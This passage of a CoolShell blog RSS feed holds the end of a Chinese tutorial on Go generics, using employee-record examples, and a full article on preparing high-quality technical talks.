+<p>正如《<a title="Go编程模式：Map-Reduce" href="https://coolshell.cn/articles/21164.html" target="_blank" rel="noopener">Go编程模式：Map-Reduce</a>》中的那个业务示例，我们在这里再做一遍。</p>
+<p>首先，我们先声明一个员工对象和相关的数据</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">type Employee struct {
+  Name     string
+  Age      int
+  Vacation int
+  Salary   float32
+}
+
+var employees = []Employee{
+  {"Hao", 44, 0, 8000.5},
+  {"Bob", 34, 10, 5000.5},
+  {"Alice", 23, 5, 9000.0},
+  {"Jack", 26, 0, 4000.0},
+  {"Tom", 48, 9, 7500.75},
+  {"Marry", 29, 0, 6000.0},
+  {"Mike", 32, 8, 4000.3},
+}</pre>
+<p>然后，我们想统一下所有员工的薪水，我们就可以使用前面的reduce函数</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">total_pay := gReduce(employees, 0.0, func(result float32, e Employee) float32 {
+  return result + e.Salary
+})
+fmt.Printf("Total Salary: %0.2f\n", total_pay) // Total Salary: 43502.05</pre>
+<p>我们函数这个 <code>gReduce</code> 函数有点啰嗦，还需要传一个初始值，在用户自己的函数中，还要关心 <code>result</code> 我们还是来定义一个更好的版本。</p>
+<p>一般来说，我们用 reduce 函数大多时候基本上是统计求和或是数个数，所以，是不是我们可以定义的更为直接一些？比如下面的这个 <code>CountIf()</code>，就比上面的 Reduce 干净了很多。</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">func gCountIf[T any](arr []T, f func(T) bool) int {
+  cnt := 0
+  for _, elem := range arr {
+    if f(elem) {
+      cnt += 1
+    }
+  }
+  return cnt;
+}</pre>
+<p>我们做求和，我们也可以写一个Sum的泛型。</p>
+<ul>
+<li>处理 <code>T</code> 类型的数据，返回 <code>U</code>类型的结果</li>
+<li>然后，用户只需要给我一个需要统计的 <code>T</code> 的 <code>U</code> 类型的数据就可以了。</li>
+</ul>
+<p>代码如下所示：</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">type Sumable interface {
+  type int, int8, int16, int32, int64,
+        uint, uint8, uint16, uint32, uint64,
+        float32, float64
+}
+
+func gSum[T any, U Sumable](arr []T, f func(T) U) U {
+  var sum U
+  for _, elem := range arr {
+    sum += f(elem)
+  }
+  return sum
+}</pre>
+<p>上面的代码我们动用了一个叫 Sumable 的接口，其限定了 U 类型，只能是 Sumable里的那些类型，也就是整型或浮点型，这个支持可以让我们的泛型代码更健壮一些。</p>
+<p>于是，我们就可以完成下面的事了。</p>
+<p><strong>1）统计年龄大于40岁的员工数</strong></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">old := gCountIf(employees, func (e Employee) bool  {
+    return e.Age &gt; 40
+})
+fmt.Printf("old people(&gt;40): %d\n", old) 
+// ld people(&gt;40): 2</pre>
+<p><strong>2）统计薪水超过 6000元的员工数</strong></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">high_pay := gCountIf(employees, func(e Employee) bool {
+  return e.Salary &gt;= 6000
+})
+fmt.Printf("High Salary people(&gt;6k): %d\n", high_pay) 
+//High Salary people(&gt;6k): 4</pre>
+<p><strong>3）统计年龄小于30岁的员工的薪水</strong></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">younger_pay := gSum(employees, func(e Employee) float32 {
+  if e.Age &lt; 30 {
+      return e.Salary
+  } 
+  return 0
+})
+fmt.Printf("Total Salary of Young People: %0.2f\n", younger_pay)
+//Total Salary of Young People: 19000.00</pre>
+<p><strong>4）统计全员的休假天数</strong></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">total_vacation := gSum(employees, func(e Employee) int {
+  return e.Vacation
+})
+fmt.Printf("Total Vacation: %d day(s)\n", total_vacation)
+//Total Vacation: 32 day(s)</pre>
+<p><strong>5）把没有休假的员工过滤出来</strong></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">no_vacation := gFilterIn(employees, func(e Employee) bool {
+  return e.Vacation == 0
+})
+print(no_vacation)
+//{Hao 44 0 8000.5} {Jack 26 0 4000} {Marry 29 0 6000}</pre>
+<p>怎么样，你大概了解了泛型编程的意义了吧。</p>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/21164.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/12/go.map_.reduce-150x150.png" alt="Go编程模式：Map-Reduce" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21164.html" class="wp_rp_title">Go编程模式：Map-Reduce</a></li><li ><a href="https://coolshell.cn/articles/21263.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/12/go.k8s-150x150.png" alt="Go 编程模式：k8s Visitor 模式" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21263.html" class="wp_rp_title">Go 编程模式：k8s Visitor 模式</a></li><li ><a href="https://coolshell.cn/articles/21228.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/12/go.line_.-150x150.png" alt="Go编程模式：Pipeline" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21228.html" class="wp_rp_title">Go编程模式：Pipeline</a></li><li ><a href="https://coolshell.cn/articles/21214.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/12/go.pair_-150x150.png" alt="Go编程模式：委托和反转控制" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21214.html" class="wp_rp_title">Go编程模式：委托和反转控制</a></li><li ><a href="https://coolshell.cn/articles/21179.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/12/go.generate-150x150.png" alt="Go 编程模式：Go Generation" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21179.html" class="wp_rp_title">Go 编程模式：Go Generation</a></li><li ><a href="https://coolshell.cn/articles/21146.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/12/go.options-150x150.png" alt="Go 编程模式：Functional Options" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21146.html" class="wp_rp_title">Go 编程模式：Functional Options</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/21615.html">Go编程模式 ： 泛型编程</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/21615.html/feed</wfw:commentRss>
+			<slash:comments>14</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>如何做一个有质量的技术分享</title>
+		<link>https://coolshell.cn/articles/21589.html</link>
+					<comments>https://coolshell.cn/articles/21589.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Tue, 13 Jul 2021 05:00:46 +0000</pubDate>
+				<category><![CDATA[技术读物]]></category>
+		<category><![CDATA[杂项资源]]></category>
+		<category><![CDATA[Knowledge Sharing]]></category>
+		<category><![CDATA[Programmer]]></category>
+		<category><![CDATA[程序员]]></category>
+		<guid isPermaLink="false">https://coolshell.cn/?p=21589</guid>
+
+					<description><![CDATA[<p>分享信息并不难，大多数人都能做到，就算是不善言谈性格内向的技术人员，通过博客或社交媒体，或是不正式的交流，他们都能或多或少的做到。但是如果你想要做一个有质量有高...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/21589.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/21589.html">如何做一个有质量的技术分享</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="alignright size-medium" src="https://coolshell.cn/wp-content/uploads/2021/07/knowledge_sharing-300x169.jpeg" alt="" width="300" height="169" />分享信息并不难，大多数人都能做到，就算是不善言谈性格内向的技术人员，通过博客或社交媒体，或是不正式的交流，他们都能或多或少的做到。但是如果你想要做一个有质量有高度的分享，这个就难了，所谓的有质量和有高度，我心里面的定义有两点：1）分享内容的保鲜期是很长的，2）会被大范围的传递。我们团队内每周都在做技术分享，虽然分享的主题都很有价值，但是分享的质量参差不齐，所以，想写下这篇文章 。供大家参考。</p>
+<p>首先，我们先扪心自问一下，我们自己觉得读到的好的技术文章是什么？我不知道大家的是什么，我个人认为的好的文章是下面这样的：</p>
+<ul>
+<li><strong>把复杂的问题讲解的很简单也很清楚</strong>。比如我高中时期读到这本1978年出版的《<a href="https://book.douban.com/subject/1441922/" target="_blank" rel="noopener">从一到无穷大</a>》，用各种简单通俗通懂的话把各种复杂的科学知识讲的清清楚楚。还有看过的几本很好的书，有一本是《<a href="https://book.douban.com/subject/5273955/" target="_blank" rel="noopener">Windows程序设计</a>》，从一个hello world的程序开始一步一步教你Windows下的原生态编程。</li>
+<li><strong>有各种各样的推导和方案的比较，让你知其然知其所以然</strong>。有了不同方案的比较，才可能让人有全面的认识。这个方面的经典作著是《<a href="https://book.douban.com/subject/5387403/" target="_blank" rel="noopener">Effective C++</a>》。</li>
+<li><strong>原理、为什么、思路、方法论会让人一通百通</strong>。这里面最经典的恐怕就是《<a href="https://book.douban.com/subject/5387403/" target="_blank" rel="noopener">十万个为什么</a>》了，在计算机方面也有几本经典书，有《<a href="https://book.douban.com/subject/1467587/" target="_blank" rel="noopener">Unix编程艺术</a>》、《<a href="https://book.douban.com/subject/1052241/" target="_blank" rel="noopener">设计模式</a>》、《<a href="https://book.douban.com/subject/1230413/" target="_blank" rel="noopener">深入理解计算机系统</a>》等书，以及《<a href="http://www.kegel.com/c10k.html" target="_blank" rel="noopener">The C10K Problem</a>》等很多技术论文。</li>
+</ul>
+<p>其实，从教科书，到专业书，再到论文，都有上面这些不错的特质。<span id="more-21589"></span></p>
+<p>所以，如果你想做一个好的技术分享的话，下面是我总结出来的方法，供你参考。</p>
+<ul>
+<li><strong>先描述好一个问题</strong>。这样能够听众带入进来，如果这个问题是他们感同身受的，那是最好了。千万不要一上来就说What，或是直接冲进答案里。这样的分享是在灌输和填鸭。把Why说清楚。没有Why，直接谈What的技术分享，通常来说价值不大。</li>
+<li><strong>How比What重要</strong>。在讲How的时候，也就是如何解这个问题。
+<ul>
+<li>先要把问题模型说清楚，有了问题模型这个框框后，方案才有意义。</li>
+<li>然后要有不同技术的比较。有了比较后，听众才会更相信你。</li>
+<li>直接上What的技术细节，其实没有太大意义。</li>
+</ul>
+</li>
+<li><strong>一定要有Best Practice或方法论总结</strong>，否则上不了档次的。也就是分享中大家可以得到的重要收获。</li>
+</ul>
+<p>说明了这个模型就是：<strong>问题 &#8211;&gt; 方案 &#8211;&gt; 总结。这其中是有一定的心理学模型的，具体表现如下：</strong></p>
+<ul>
+<li>用问题来吸引受众，带着受众来一起思考</li>
+<li>用问题模型来框住受众的思考范围，让受众聚焦</li>
+<li>给出几种不同的解决方案，比较他们的优缺点，让受众有一种解决问题的参与感。</li>
+<li>最后，给出最佳实践，方法论或套路，因为有了前三步的铺垫，受众欣然接受。</li>
+<li>整个过程会让受众有强烈的成长感和收获感。</li>
+</ul>
+<p>这里有几个示例，也是我在我司 MegaEase 内部的技术分享，供你参考（<a href="https://www.youtube.com/user/chenhaox/videhttps://www.youtube.com/channel/UCJhxX8SXcYdNWc6QMbWKs7Aos" target="_blank" rel="noopener">我个人的YouTube频道</a>）</p>
+<p>技术分享：<a href="https://youtu.be/qB40kqhTyYM" target="_blank" rel="noopener">Prometheus是怎么存储数据的</a>（Youtube）</p>
+<p><iframe loading="lazy" title="技术分享：Prometheus是怎么存储数据的（陈皓）" width="640" height="360" src="https://www.youtube.com/embed/qB40kqhTyYM?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></p>
+<p>技术分享：<a href="https://www.youtube.com/watch?v=VnbC5RG1fEo" target="_blank" rel="noopener">Distributed Lock Manager</a>（Youtube）</p>
+<p><iframe loading="lazy" title="技术分享：Distributed Lock Manager（陈皓）" width="640" height="360" src="https://www.youtube.com/embed/VnbC5RG1fEo?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></p>
+<p>下面是我写在我们公司内的Knowledge Sharing中的Best Practice，供参考</p>
+<h2>Sharing Guideline</h2>
+<p>Please follow the following sharing protocols</p>
+<h3><a id="user-content-understand-sharing" class="anchor" href="https://github.com/megaease/team/tree/master/sharing#understand-sharing" aria-hidden="true"></a>Understand Sharing</h3>
+<ul>
+<li>Sharing is the hard way to learn knowledge. The presenter gains the biggest advantages. not audience. 分享是学习知识的最难的方式。分享者获得的好处最最多的，而不是观众。</li>
+<li>Sharing can open the knowledge door for the audience, but you have to walk to knowledge by yourself. 分享可以为听众打开知识的大门，但你能不能获得知识还要靠你自己。</li>
+</ul>
+<h3><a id="user-content-best-practices" class="anchor" href="https://github.com/megaease/team/tree/master/sharing#best-practices" aria-hidden="true"></a>Best Practices</h3>
+<p>To perform a great sharing, please follow the below practices.</p>
+<ul>
+<li>Do not share a big topic, a small topic is better. A big topic could make the audience lose focus. Remember, <a href="https://en.wikipedia.org/wiki/Minimalism#Minimalist_design_and_architecture" rel="nofollow">Less is More!</a></li>
+<li>Sharing time less than 60 mins is the best.</li>
+<li>English language for slides is preferred.</li>
+<li>While prepare the sharing contents, it&#8217;s better to discuss with the senior people to help you to see the whole picture, understand the good side and bad side, know what you don&#8217;t know &#8230; etc.</li>
+<li>Strong Recommend Materials Outlines
+<ul>
+<li>What&#8217;s the Problem?</li>
+<li>How to Solve the Problem?</li>
+<li>The Best Solution or Practice.</li>
+<li>The Mechanism, Key Techniques, and Source Code</li>
+<li>Pros/Cons</li>
+<li>References (Further reading)</li>
+</ul>
+</li>
+</ul>
+<blockquote><p>For example, if you want to sharing a topic about Docker. the following outlines would be good one:</p>
+<ul>
+<li>What&#8217;s the major problems need to solve. (Provision, Environment, Isolation etc.)</li>
+<li>The Alternative solutions. (Puppet/Chef/Ansible, VM, LXC etc.)</li>
+<li>The Best Solution &#8211; Docker. Why?</li>
+<li>Docker&#8217;s key techniques &#8211; image, cgroup, union fs, namespace&#8230;</li>
+<li>Docker&#8217;s Pros/Cons</li>
+<li>Further reading list.</li>
+</ul>
+</blockquote>
+<p><img decoding="async" loading="lazy" class="aligncenter size-full" src="https://coolshell.cn/wp-content/uploads/2021/07/截屏2021-07-13-12.53.33.png" alt="" width="573" height="173" /></p>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/22298.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/10/communication-150x150.png" alt="聊聊团队协同和协同工具" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22298.html" class="wp_rp_title">聊聊团队协同和协同工具</a></li><li ><a href="https://coolshell.cn/articles/22173.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/02/http_method-150x150.png" alt="“一把梭：REST API 全用 POST”" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22173.html" class="wp_rp_title">“一把梭：REST API 全用 POST”</a></li><li ><a href="https://coolshell.cn/articles/22157.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/02/monitoring-150x150.jpeg" alt="谈谈公司对员工的监控" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22157.html" class="wp_rp_title">谈谈公司对员工的监控</a></li><li ><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/08/programmer.01-e1596792460687-150x150.png" alt="程序员如何把控自己的职业" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_title">程序员如何把控自己的职业</a></li><li ><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/01/remote-150x150.jpg" alt="MegaEase的远程工作文化" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_title">MegaEase的远程工作文化</a></li><li ><a href="https://coolshell.cn/articles/20276.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2019/12/open-your-creative-mind-150x150.jpg" alt="别让自己“墙”了自己" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20276.html" class="wp_rp_title">别让自己“墙”了自己</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/21589.html">如何做一个有质量的技术分享</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/21589.html/feed</wfw:commentRss>
+			<slash:comments>28</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
